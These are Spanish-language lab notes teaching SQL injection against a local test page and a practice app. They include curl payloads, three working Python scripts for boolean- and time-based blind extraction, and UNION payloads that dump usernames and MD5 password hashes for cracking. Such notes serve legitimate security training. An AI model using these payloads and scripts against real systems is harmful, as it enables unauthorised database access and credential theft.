- **curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or 1=1"** ==IMPORTANTE TENER EN CUENTA QUE EN EL SCRIPT PHP NO DEBE HABER COMILLAS AL REDEDOR DE== **$id** porque de lo contrario nos dará código de estado 404 aunque hagamos el **or**.

Acá lo que hacemos es decirle que pruebe con **id=9** (Que no existe) y si da un error, que pruebe **1=1** que es **verdadero**. 
Esto se hace para que nos tome que el identificador de usuario proporcionado (**9**) **exista** a pesar de no ser así.

Ahora empleando la misma metodología podemos crear una **Nested Query** ==(Una Query dentro de otra Query)== pero con la **sintaxis probada previamente en la web**, por lo tanto quedaría así.

- **curl -s -I -X GET "http://localhost/searchUsers.php" -G --data-urlencode "id=9 or (select(select ascii(substring(username,1,1)) from users where id = 1)=97)"**

En este caso nosotros suponemos que **no conocemos** el nombre del usuario **admin**, pero que **si conocemos** el nombre de la **tabla users** y la **columna username** en este caso.
Colocamos la condición de que **97=97** que es lo mismo que **a=a**

Lo que estamos haciendo es indicar que queremos filtrar de la tabla **users** el usuario que **corresponde al ID 1** pero **solo su primer carácter** para ir **identificándolo carácter por carácter** hasta conseguir el **nombre completo**.

-------

En la siguiente imagen colocamos **97** que equivale a la letra '**a**' pero en decimal, que justamente es la primer letra del usuario **'a'dmin** por lo tanto nos da el código de estado **200 OK**
También colocamos **98** que equivale a la letra '**b**' pero en decimal, pero como **no coincide** con la primer letra del usuario, nos devuelve un código de estado **404 Not Found**.

![[Petición GET con condicional.png]]

-----------

De esta manera tenemos una vía potencial de **identificar el nombre de un usuario a ciegas**, sin ver OUTPUT de nada, cuando el carácter es **correcto** o cuando **no lo es**.

Ahora entrará en juego la parte de **Python Scripting** para poder realizar esto de una manera **mucho mas eficiente**.

### Python Scripting (Boolean-based blind SQL Injection)

Para los que tengan algún problema con la instalación del módulo "**pwn**". Probar el "pip3 install pwn", y si les sale "**error: externally-managed-enviromment**", ejecuta el siguiente comando: ```sudo mv /usr/lib/python3.11/EXTERNALLY-MANAGED /usr/lib/python3.11/EXTERNALLY-MANAGED.old``` Al parecer este error ocurre a partir de python 3.11 en adelante.

#### Script Python sin usar PWN tools (Sin estética)
```python
#!/usr/bin/python3

# BOOLEAN BASED BLIND SQLI ------------------------------------------------------------

import requests
import signal
import sys
import string

# Ctrl+C ----------------------------------------------

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# time.sleep(10) <---- SLEEP PARA PROBAR EL CTRL+C

# CTRL+C ----------------------------------------------

# Variables Globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    # Aca se hace un bucle anidado para recorrer de 1 al 200 representando a la posición de cada letra, y luego del 33 al 126 representando todos los caractes en Hex existentes.
    for position in range(1, 200):
        for character in range(33, 126):
	        # Aca se define la URL con la inyección buscando la información que queramos, en este caso queremos listar los nombre de todas las bases de datos.
            sqli_url = main_url + "?id=4 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)= %d)" % (position, character) # String formatting
            
            # Aca se define la petición por get, la cual brindara muchos 404 y muchos 200, nosotros queremos los 200 que son las combinaciones exitosas de letras.
            r = requests.get(sqli_url)

            # Aca se define el condicional para decirle que queremos que nos muestre aquella respuesta que tenga un 200OK y que pase ese caracter a legile ya que esta en hex.
            if r.status_code == 200:
                print(chr(character))
                break

if __name__ == '__main__':

    makeSQLI()
```
#### Script Python usando PWN tools (Estético)
```python
#!/usr/bin/python3

# BOOLEAN BASED BLIND SQLI ------------------------------------------------------------

import requests
import signal
import sys
import string
from pwn import *

def def_handler(sig, frame):
    print ("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+c 
signal.signal(signal.SIGINT, def_handler)

# Variables GLOBALES
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1, 200):
        for character in range(33, 127):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character) 
            
            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```
## SQLI time-based blind

La **SQLI time-based blind**, es un tipo de inyección **muy similar a la Boolean-based blind SQLI**, ya que nos aprovechamos del tipo de respuesta que nos brinda la web utilizando el comando **sleep** para poder conseguir información acerca de los caracteres que contiene, dependiendo de **si el sleep se aplica o no**.

Ahora procedemos a hacer **lo mismo que hacíamos con la Boolean-based blind SQLI**, colocaremos carácter por carácter para poder **identificar con fuerza bruta** si el dato que queremos **existe** o **no existe**.

Supongamos que queremos hallar el nombre de la **base de datos** en uso, para esto haríamos uso de la condición **if**

El **if** en MySQL toma tres argumentos: 
1) La condición que se evalúa: **(substring(database(),1,1)='H'**
2) Lo que se devuelve si la condición es verdadera: **sleep(5)**
3) Lo que se devuelve si la condición es falsa: **1**

En el siguiente ejemplo indicamos que si el primer carácter de la base de datos actual empieza con '**H**', que realice un **sleep de 5 segundos**, de lo contrario que **me devuelva un 1 meramente descriptivo**.

- **?id= 1 and if(substring(database(),1,1)='H',sleep(5),1)**

Algo a tener en cuenta es que **no diferencia entre mayúsculas y minúsculas**, y esto para las contraseñas podría ser una complejidad extra, por lo tanto **se recomienda pasar a decimal para que el carácter que nos brinde sea el exacto**.
También nosotros en este caso estamos usando **comillas simples**, pero **si no pudiésemos hacerlo** porque la base de datos nos escapa los caracteres especiales, **aplicamos el carácter pero en decimal** de igual forma.

La **H** mayúscula en decimal es igual a **72**, por lo tanto si colocamos el sintaxis tal que así

- **?id= 1 and if(ascii(substring(database(),1,1))=72,sleep(5),1)**

Estamos diciendo que **72=72**, que sería lo mismo que decir que el **primer carácter** de la base de datos actual es igual a H, de ser esto correcto (Que lo es), se aplicaría el **sleep 5**.
==No es necesario poner un sleep tan largo, podemos colocar como mínimo un 0.50==

Sabiendo todo esto podríamos modificar el **script** de **Boolean-based blind** y adaptarlo para poder usarlo con una **SQLI time-based blind**.

```python
#!/usr/bin/python3

# TIME BASED BLIND SQLI --------------------------------------------------------------------------

import requests
import signal
import sys
import time
import string
from pwn import *

# Ctrl+C ----------------------------------------------

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# time.sleep(10) <---- SLEEP PARA PROBAR EL CTRL+C

# CTRL+C ----------------------------------------------

# Variables Globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    # Creando barras de progreso con PWN TOOLS
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    
    time.sleep(2)

    p2 = log.progress("Datos extraídos")

    extracted_info = ""

    # Aca se hace un bucle anidado para recorrer de 1 al 200 representando a la posición de cada letra, y luego del 33 al 126 representando todos los caractes en Hex existente
s.
    for position in range(1, 200):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1 and if(ascii(substring(database(),%d,1))=%d,sleep(0.5),1)" % (position, character) # String formatting
            
            p1.status(sqli_url)
            
            time_start = time.time()

            # Aca se define la petición por get, la cual brindara muchos 404 y muchos 200, nosotros queremos los 200 que son las combinaciones exitosas de letras.
            r = requests.get(sqli_url)

            time_end = time.time()

            # Aca se define el condicional para decirle que queremos que nos muestre aquella respuesta que tenga un 200OK y que pase ese caracter a legile ya que esta en hex.
            if time_end - time_start > 0.5:
                # En este caso la variable extracted_info almacenará los datos exitosos en su variable, para mostrarlo mas ordenado
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```

# Jugando con SQLI Training

## Register lvl 1

En este panel la base de datos actual posee **5 columnas**, ya que lo descubrimos mediante fuzzing con **order by 5** por lo tanto colocamos un dato para cada una tal que así

![[SQLI TRAINING 5 COLUMNAS.png]]

--------

El 1 no aparece porque debe estar por otro lado, pero con que nos aparezcan los demás ya estamos bien porque podemos reemplazar esos valores por lo que nos interese (En nuestro caso usaremos el numero "2"), en este caso queremos **listar todas las bases de datos existentes** por lo tanto haríamos lo siguiente. ``1234' union select 1,2,schema_name,4,5 from information_schema.schemata-- -``
![[SQLI TRAINING BASES DE DATOS.png]]

----------------

Ahora que sabemos el nombre de las bases de datos debemos **listar los nombres de las tablas** con la siguiente sintaxis. ``1234' union select 1,table_name,3,4,5 from information_schema.tables where table_schema = 'sqlitraining'-- -``
![[SQLI TRAINING TABLAS.png]]

-------

Ahora como nos parece jugosa la tabla users la vamos a observar con la siguiente sintaxis. ``1234' union select 1,column_name,2,3,4,5 from information_schema.columns where table_schema = 'sqlitraining' and table_name = 'users'``
![[SQLI TRAINING COLUMNAS ID, USERNAME Y PASSWORD.png]]

--------

Una vez conseguimos el nombre de las columnas, solo precisamos nombrarlas y adjuntarles a un lado el nombre de la base de datos seguido de un punto con el nombre de la tabla correspondiente tal que así.

``1234' union select 1,group_concat(username,0x3a,password),3,4,5 from sqlitraining.users-- -`` Esto se vera **todo en una linea y quedará muy feo**, por lo tanto podemos hacer lo siguiente aprovechando la columna "3"

``1234' union select 1,username,password,4,5 from sqlitraining.users-- -`` Esto quedaría tal que así
![[SQLI TRAINING DATOS DE LAS COLUMNAS.png]]

------

Las contraseñas están hasheadas con **md5** por lo que se ve, por lo tanto usaremos un cracker web como lo es https://hashes.com/es/decrypt/hash

![[SQLI TRAINING Contraseñas.png]]